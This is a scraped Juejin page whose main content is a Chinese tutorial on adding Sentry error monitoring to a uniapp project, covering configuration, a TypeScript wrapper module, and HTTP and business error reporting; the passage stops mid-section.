<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSusuperli" target="_blank" title="https://github.com/Susuperli" ref="nofollow noopener noreferrer">Susuperli</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftanjiahao24" target="_blank" title="https://github.com/tanjiahao24" ref="nofollow noopener noreferrer">tanjiahao24</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fthinkasany" target="_blank" title="https://github.com/thinkasany" ref="nofollow noopener noreferrer">thinkasany</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fug-hero" target="_blank" title="https://github.com/ug-hero" ref="nofollow noopener noreferrer">ug-hero</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fwanpan11" target="_blank" title="https://github.com/wanpan11" ref="nofollow noopener noreferrer">wanpan11</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FWxh16144" target="_blank" title="https://github.com/Wxh16144" ref="nofollow noopener noreferrer">Wxh16144</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxkhanhan" target="_blank" title="https://github.com/xkhanhan" ref="nofollow noopener noreferrer">xkhanhan</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyellowryan" target="_blank" title="https://github.com/yellowryan" ref="nofollow noopener noreferrer">yellowryan</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyoyo837" target="_blank" title="https://github.com/yoyo837" ref="nofollow noopener noreferrer">yoyo837</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzjr222" target="_blank" title="https://github.com/zjr222" ref="nofollow noopener noreferrer">zjr222</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FzombieJ" target="_blank" title="https://github.com/zombieJ" ref="nofollow noopener noreferrer">zombieJ</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FZyf665" target="_blank" title="https://github.com/Zyf665" ref="nofollow noopener noreferrer">Zyf665</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uniapp 项目接入 sentry监控]]></title>    <link>https://juejin.cn/post/7575937594350845995</link>    <guid>https://juejin.cn/post/7575937594350845995</guid>    <pubDate>2025-11-24T05:03:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575937594350845995" data-draft-id="7575937594350829611" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uniapp 项目接入 sentry监控"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-24T05:03:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="半瓶神仙醋"/> <meta itemprop="url" content="https://juejin.cn/user/2538123586707662"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uniapp 项目接入 sentry监控
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2538123586707662/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    半瓶神仙醋
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T05:03:51.000Z" title="Mon Nov 24 2025 05:03:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Sentry 接入使用文档</h2>
<h3 data-id="heading-1">📋 目录</h3>
<ul>
<li><a href="#%E6%A6%82%E8%BF%B0" title="#%E6%A6%82%E8%BF%B0">概述</a></li>
<li><a href="#%E4%BE%9D%E8%B5%96%E5%AE%89%E8%A3%85" title="#%E4%BE%9D%E8%B5%96%E5%AE%89%E8%A3%85">依赖安装</a></li>
<li><a href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE" title="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE">环境配置</a></li>
<li><a href="#%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE" title="#%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE">核心配置</a></li>
<li><a href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B" title="#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B">初始化流程</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F" title="#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F">使用方式</a></li>
<li><a href="#%E9%94%99%E8%AF%AF%E4%B8%8A%E6%8A%A5%E5%9C%BA%E6%99%AF" title="#%E9%94%99%E8%AF%AF%E4%B8%8A%E6%8A%A5%E5%9C%BA%E6%99%AF">错误上报场景</a></li>
<li><a href="#%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E5%85%B3%E8%81%94" title="#%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E5%85%B3%E8%81%94">用户信息关联</a></li>
<li><a href="#%E5%B9%B3%E5%8F%B0%E5%B7%AE%E5%BC%82%E8%AF%B4%E6%98%8E" title="#%E5%B9%B3%E5%8F%B0%E5%B7%AE%E5%BC%82%E8%AF%B4%E6%98%8E">平台差异说明</a></li>
</ul>
<hr/>
<h3 data-id="heading-2">概述</h3>
<p>本项目使用 <code>sentry-uniapp</code> 进行错误监控和上报，支持 H5、小程序、APP 多平台。Sentry 会自动捕获未处理的异常，同时提供手动上报接口用于业务错误和异常。</p>
<h4 data-id="heading-3">核心特性</h4>
<ul>
<li>✅ 自动捕获全局异常</li>
<li>✅ HTTP 请求错误自动上报</li>
<li>✅ 业务错误码上报</li>
<li>✅ 用户信息关联</li>
<li>✅ 环境开关控制</li>
<li>✅ 多平台支持</li>
</ul>
<hr/>
<h3 data-id="heading-4">依赖安装</h3>
<p>项目已安装 Sentry 依赖包：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"sentry-uniapp"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^1.0.12"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h3 data-id="heading-5">环境配置</h3>
<h4 data-id="heading-6">1. 环境变量配置</h4>
<p>在 <code>.env</code> 文件中配置 Sentry DSN：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Sentry DSN（必填，用于错误上报）</span>
VITE_SENTRY_DSN=https://your-sentry-dsn@sentry.io/project-id

<span class="hljs-comment"># 是否启用 Sentry（可选，默认从 profile 读取）</span>
VITE_SENTRY_ENABLE=<span class="hljs-literal">true</span>
</code></pre>
<p><strong>类型定义</strong> (<code>typings/env.d.ts</code>):</p>
<pre><code class="hljs language-36:39:typings/env.d.ts" lang="36:39:typings/env.d.ts">  /** Sentry DSN */
  readonly VITE_SENTRY_DSN?: string
  /** 是否启用 Sentry */
  readonly VITE_SENTRY_ENABLE?: 'true' | 'false'
</code></pre>
<h4 data-id="heading-7">2. Profile 配置</h4>
<p>在 <code>env-conf.ts</code> 中配置各环境的 Sentry 开关：</p>
<pre><code class="hljs language-15:33:env-conf.ts" lang="15:33:env-conf.ts">      // 是否启用Sentry
      SENTRY_ENABLE: true,
    },
    uat: {
      DELETE_CONSOLE: false,
      SHOW_SOURCEMAP: false,
      APP_PROXY_ENABLE: false,
      CLIENT_TYPE_BUYER: 'buyer',
      CLIENT_TYPE_SELLER: 'seller',
      SENTRY_ENABLE: false,
    },
    production: {
      DELETE_CONSOLE: false,
      SHOW_SOURCEMAP: false,
      APP_PROXY_ENABLE: false,
      CLIENT_TYPE_BUYER: 'buyer',
      CLIENT_TYPE_SELLER: 'seller',
      SENTRY_ENABLE: true,
    },
</code></pre>
<p><strong>配置说明</strong>：</p>
<ul>
<li><code>development</code>: 开发环境，默认启用</li>
<li><code>uat</code>: 测试环境，默认关闭</li>
<li><code>production</code>: 生产环境，默认启用</li>
</ul>
<hr/>
<h3 data-id="heading-8">核心配置</h3>
<h4 data-id="heading-9">Sentry 核心文件 (<code>src/sentry.ts</code>)</h4>
<p>这是 Sentry 的核心配置文件，提供了初始化、错误捕获、用户信息设置等功能。以下是完整的代码：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">Sentry</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'sentry-uniapp'</span>
<span class="hljs-keyword">import</span> { profile } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/profile'</span>

<span class="hljs-comment">/**
 * 检查是否启用 Sentry
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">isSentryEnabled</span>(<span class="hljs-params"/>): <span class="hljs-built_in">boolean</span> {
  <span class="hljs-keyword">const</span> { <span class="hljs-variable constant_">VITE_SENTRY_DSN</span> } = <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">env</span>
  <span class="hljs-comment">// 必须同时满足：profile 中启用开关为 true 且 DSN 已配置</span>
  <span class="hljs-keyword">return</span> profile.<span class="hljs-property">SENTRY_ENABLE</span> &amp;&amp; !!<span class="hljs-variable constant_">VITE_SENTRY_DSN</span>
}

<span class="hljs-comment">/**
 * 初始化 Sentry
 * 在 App.vue 的 onLaunch 中调用
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">initSentry</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { <span class="hljs-variable constant_">VITE_SENTRY_DSN</span> } = <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">env</span>

  <span class="hljs-comment">// 检查是否启用</span>
  <span class="hljs-keyword">if</span> (!profile.<span class="hljs-property">SENTRY_ENABLE</span>) {
    <span class="hljs-keyword">return</span>
  }

  <span class="hljs-comment">// 检查 DSN 是否配置</span>
  <span class="hljs-keyword">if</span> (!<span class="hljs-variable constant_">VITE_SENTRY_DSN</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'[Sentry] 已启用但 DSN 未配置，Sentry 初始化失败'</span>)
    <span class="hljs-keyword">return</span>
  }

  <span class="hljs-keyword">const</span> isAppPlatform =
    <span class="hljs-title class_">String</span>(__UNI_PLATFORM__) === <span class="hljs-string">'app'</span> || <span class="hljs-title class_">String</span>(__UNI_PLATFORM__) === <span class="hljs-string">'app-harmony'</span>

  <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">init</span>({
    <span class="hljs-attr">dsn</span>: <span class="hljs-variable constant_">VITE_SENTRY_DSN</span>,
    <span class="hljs-comment">// extraOptions 主要是解决平台差异问题的</span>
    <span class="hljs-comment">// 非 APP 平台，可以不使用</span>
    <span class="hljs-attr">extraOptions</span>: isAppPlatform
      ? {
          <span class="hljs-attr">onmemorywarning</span>: <span class="hljs-literal">false</span>,
          <span class="hljs-attr">onerror</span>: <span class="hljs-literal">false</span>,
        }
      : <span class="hljs-literal">undefined</span>,
  })
}

<span class="hljs-comment">/**
 * 设置 Sentry 用户信息
 * 保留此函数，因为 src/stores/user.ts 中需要使用
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">setSentryUser</span>(<span class="hljs-params">userInfo?: { id?: <span class="hljs-built_in">string</span>; username?: <span class="hljs-built_in">string</span> }</span>) {
  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isSentryEnabled</span>()) <span class="hljs-keyword">return</span>

  <span class="hljs-keyword">if</span> (userInfo?.<span class="hljs-property">id</span> &amp;&amp; userInfo?.<span class="hljs-property">username</span>) {
    <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">configureScope</span>(<span class="hljs-function"><span class="hljs-params">scope</span> =&gt;</span> {
      scope.<span class="hljs-title function_">setUser</span>({
        <span class="hljs-attr">id</span>: <span class="hljs-title class_">String</span>(userInfo.<span class="hljs-property">id</span>), <span class="hljs-comment">// 确保 id 是字符串</span>
        <span class="hljs-attr">username</span>: userInfo.<span class="hljs-property">username</span>,
      })
    })
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">configureScope</span>(<span class="hljs-function"><span class="hljs-params">scope</span> =&gt;</span> {
      scope.<span class="hljs-title function_">setUser</span>(<span class="hljs-literal">null</span>)
    })
  }
}

<span class="hljs-comment">/**
 * 捕获异常
 * 在 App.vue 的 onError 中调用
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">captureException</span>(<span class="hljs-params">error: <span class="hljs-built_in">unknown</span>, extra?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;</span>) {
  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isSentryEnabled</span>()) <span class="hljs-keyword">return</span>

  <span class="hljs-comment">// 使用 withScope 确保额外信息能够正确附加</span>
  <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">withScope</span>(<span class="hljs-function"><span class="hljs-params">scope</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (extra) {
      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(extra).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
        scope.<span class="hljs-title function_">setExtra</span>(key, extra[key])
      })
    }
    <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">captureException</span>(error)
  })
}

<span class="hljs-comment">/**
 * 捕获消息
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">captureMessage</span>(<span class="hljs-params">message: <span class="hljs-built_in">string</span>, extra?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;</span>) {
  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isSentryEnabled</span>()) <span class="hljs-keyword">return</span>

  <span class="hljs-comment">// 使用 withScope 确保额外信息（包括 traceId）能够正确附加</span>
  <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">withScope</span>(<span class="hljs-function"><span class="hljs-params">scope</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (extra) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'extra'</span>, extra)
      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(extra).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
        scope.<span class="hljs-title function_">setExtra</span>(key, extra[key])
      })
    }
    <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">captureMessage</span>(message)
  })
}

<span class="hljs-comment">// 导出 Sentry 对象，以便在需要时直接使用</span>
<span class="hljs-keyword">export</span> { <span class="hljs-title class_">Sentry</span> }
</code></pre>
<p><strong>代码说明</strong>：</p>
<ol>
<li>
<p><strong><code>isSentryEnabled()</code></strong>: 检查是否启用 Sentry，必须同时满足 <code>profile.SENTRY_ENABLE === true</code> 和 <code>VITE_SENTRY_DSN</code> 已配置</p>
</li>
<li>
<p><strong><code>initSentry()</code></strong>: 初始化 Sentry</p>
<ul>
<li>检查启用开关和 DSN 配置</li>
<li>APP 平台需要特殊配置 <code>extraOptions</code> 来禁用某些钩子，避免与 <code>App.onError</code> 冲突</li>
</ul>
</li>
<li>
<p><strong><code>setSentryUser()</code></strong>: 设置或清除 Sentry 用户信息</p>
<ul>
<li>用于关联错误和用户，便于问题追踪</li>
<li>登出时传入 <code>undefined</code> 清除用户信息</li>
</ul>
</li>
<li>
<p><strong><code>captureException()</code></strong>: 捕获异常</p>
<ul>
<li>用于真正的异常（网络错误、代码错误等）</li>
<li>支持附加额外上下文信息</li>
</ul>
</li>
<li>
<p><strong><code>captureMessage()</code></strong>: 捕获消息</p>
<ul>
<li>用于业务逻辑错误（错误码等，不是异常）</li>
<li>支持附加额外上下文信息</li>
</ul>
</li>
<li>
<p><strong>导出 Sentry 对象</strong>: 允许在特殊场景下直接使用 Sentry 的原生 API</p>
</li>
</ol>
<hr/>
<h3 data-id="heading-10">初始化流程</h3>
<h4 data-id="heading-11">App.vue 中的初始化</h4>
<p>在 <code>src/App.vue</code> 的 <code>onLaunch</code> 钩子中初始化 Sentry：</p>
<pre><code class="hljs language-87:111:src/App.vue" lang="87:111:src/App.vue">onLaunch(() =&gt; {
  console.log('App Launch')

  // 初始化 Sentry
  initSentry()

  // 安全初始化埋点SDK（内部会等待 App 实例准备好）
  safeInitTrack()

  // 延迟检查和测试（给足够时间让埋点初始化完成）
  setTimeout(() =&gt; {
    if (checkTrackInit()) {
      // 开发环境下测试埋点
      if (import.meta.env.MODE === 'dev') {
        testTrack()
      }
    }

    // 设置 Sentry 用户信息
    const userStore = useUserStore()
    const { userId, username } = userStore.userInfo || {}
    if (userId &amp;&amp; username) {
      setSentryUser({ id: userId, username })
    }
  }, 3500) // 增加到 3.5 秒，确保 waitForAppReady 完成
</code></pre>
<h4 data-id="heading-12">全局错误捕获</h4>
<p>在 <code>src/App.vue</code> 的 <code>onError</code> 钩子中捕获全局异常：</p>
<pre><code class="hljs language-146:155:src/App.vue" lang="146:155:src/App.vue">// sentry-uniapp 内部是通过 uni.onError 钩子函数捕获错误的
// 但目前 uni.onError 暂不支持 App (android / ios)，各平台支持情况参考：
// https://uniapp.dcloud.net.cn/api/application.html#onerror
//
// 通用方案：
// 可用 App.onError 自己处理，但需要先禁用 sentry 里的捕获
// 方法在 sentry.init 参数里加上 extraOptions: { onerror: false }
onError((error: unknown) =&gt; {
  captureException(error)
})
</code></pre>
<p><strong>注意</strong>：</p>
<ul>
<li><code>sentry-uniapp</code> 内部通过 <code>uni.onError</code> 钩子捕获错误</li>
<li>但 <code>uni.onError</code> 暂不支持 APP 平台（Android/iOS）</li>
<li>APP 平台需要在 <code>sentry.init</code> 中配置 <code>extraOptions: { onerror: false }</code>，然后使用 <code>App.onError</code> 手动捕获</li>
</ul>
<hr/>
<h3 data-id="heading-13">使用方式</h3>
<h4 data-id="heading-14">1. 导入函数</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { captureException, captureMessage, setSentryUser } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/sentry'</span>
</code></pre>
<h4 data-id="heading-15">2. 捕获异常</h4>
<p>用于捕获真正的异常（如网络错误、代码错误等）：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">try</span> {
  <span class="hljs-comment">// 可能出错的代码</span>
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">someAsyncOperation</span>()
} <span class="hljs-keyword">catch</span> (error) {
  <span class="hljs-title function_">captureException</span>(error, {
    <span class="hljs-comment">// 可选的额外信息</span>
    <span class="hljs-attr">operation</span>: <span class="hljs-string">'someOperation'</span>,
    <span class="hljs-attr">userId</span>: <span class="hljs-string">'123'</span>,
  })
}
</code></pre>
<h4 data-id="heading-16">3. 捕获业务错误</h4>
<p>用于捕获业务逻辑返回的错误（不是异常，而是业务错误码）：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">apiCall</span>()
<span class="hljs-keyword">if</span> (!response.<span class="hljs-property">succeed</span>) {
  <span class="hljs-title function_">captureMessage</span>(<span class="hljs-string">`业务返回错误码: <span class="hljs-subst">${response.code}</span>`</span>, {
    <span class="hljs-attr">errorCode</span>: response.<span class="hljs-property">code</span>,
    <span class="hljs-attr">traceId</span>: response.<span class="hljs-property">traceId</span>,
    <span class="hljs-attr">url</span>: <span class="hljs-string">'/api/endpoint'</span>,
  })
}
</code></pre>
<h4 data-id="heading-17">4. 设置用户信息</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 设置用户信息</span>
<span class="hljs-title function_">setSentryUser</span>({ <span class="hljs-attr">id</span>: <span class="hljs-string">'123'</span>, <span class="hljs-attr">username</span>: <span class="hljs-string">'john_doe'</span> })

<span class="hljs-comment">// 清除用户信息（登出时）</span>
<span class="hljs-title function_">setSentryUser</span>()
</code></pre>
<hr/>
<h3 data-id="heading-18">错误上报场景</h3>
<h4 data-id="heading-19">1. HTTP 请求错误上报</h4>
<p>在 <code>src/service/index.ts</code> 中，HTTP 请求拦截器会自动上报错误：</p>
<h5 data-id="heading-20">业务错误上报（使用 captureMessage）</h5>
<pre><code class="hljs language-14:25:src/service/index.ts" lang="14:25:src/service/index.ts">function reportBusinessErrorToSentry(
  message: string,
  requestOptions: CustomRequestOptions,
  extra?: Record&lt;string, unknown&gt;,
): void {
  captureMessage(message, {
    url: requestOptions.url,
    method: requestOptions.method || 'GET',
    requestParams: requestOptions.data || requestOptions.query || {},
    ...extra,
  })
}
</code></pre>
<p><strong>使用场景</strong>：</p>
<pre><code class="hljs language-48:55:src/service/index.ts" lang="48:55:src/service/index.ts">function handleBusinessError&lt;T&gt;(data: BaseRes&lt;T&gt;, requestOptions: CustomRequestOptions): boolean {
  globalErrorMonitor.handleError(data.code, data)
  // 业务错误使用 captureMessage（不是异常，是业务逻辑返回的错误）
  reportBusinessErrorToSentry(`业务返回错误码: ${data.code}`, requestOptions, {
    errorCode: data.code,
    traceId: data.traceId,
    errorData: data,
  })
</code></pre>
<h5 data-id="heading-21">HTTP 错误上报（使用 captureException）</h5>
<pre><code class="hljs language-30:42:src/service/index.ts" lang="30:42:src/service/index.ts">function reportExceptionToSentry(
  message: string,
  requestOptions: CustomRequestOptions,
  extra?: Record&lt;string, unknown&gt;,
): void {
  const error = new Error(message)
  captureException(error, {
    url: requestOptions.url,
    method: requestOptions.method || 'GET',
    requestParams: requestOptions.data || requestOptions.query || {},
    ...extra,
  })
}
</code></pre>
<p><strong>使用场景</strong>：</p>
<pre><code class="hljs language-75:85:src/service/index.ts" lang="75:85:src/service/index.ts">function handleHttpError&lt;T&gt;(
  statusCode: number,
  data: BaseRes&lt;T&gt;,
  requestOptions: CustomRequestOptions,
): void {
  const message = data.message || (statusCode === 401 ? '未授权' : '请求错误')
  // HTTP 错误使用 captureException（是真正的异常）
  reportExceptionToSentry(`HTTP ${statusCode}: ${message}`, requestOptions, {
    statusCode,
    errorData: data,
  })
</code></pre>
<h5 data-id="heading-22">网络错误上报（使用 captureException）</h5>
<pre><code class="hljs language-95:100:src/service/index.ts" lang="95:100:src/service/index.ts">function handleNetworkError&lt;T&gt;(err: unknown, requestOptions: CustomRequestOptions): BaseRes&lt;T&gt; {
  uni.showToast({ icon: 'none', title: '网络错误，换个网络试试' })

  const errorMessage = typeof err === 'string' ? err : JSON.stringify(err)
  // 网络错误使用 captureException（是真正的异常）
  reportExceptionToSentry(`网络请求失败: ${errorMessage}`, requestOptions, { errorData: err })
</code></pre>
<h4 data-id="heading-23">2. 全局错误监控</h4>
<p>在 <code>src/utils/globalErrorMonitor.ts</code> 中，未处理的错误码会统一上报到 Sentry：</p>
<pre><code class="hljs language-28:37:src/utils/globalErrorMonitor.ts" lang="28:37:src/utils/globalErrorMonitor.ts">  public handleError(errCode: string, errorData?: any): void {
    switch (errCode) {
      case 'ACOM10000':
        this.handlePermissionUpdated()
        break
      // 可以添加其他错误码的处理
      default:
        // 未处理的错误码已在 service/index.ts 中统一上报到 Sentry
        break
    }
  }
</code></pre>
<hr/>
<h3 data-id="heading-24">用户信息关联</h3>
<h4 data-id="heading-25">自动设置用户信息</h4>
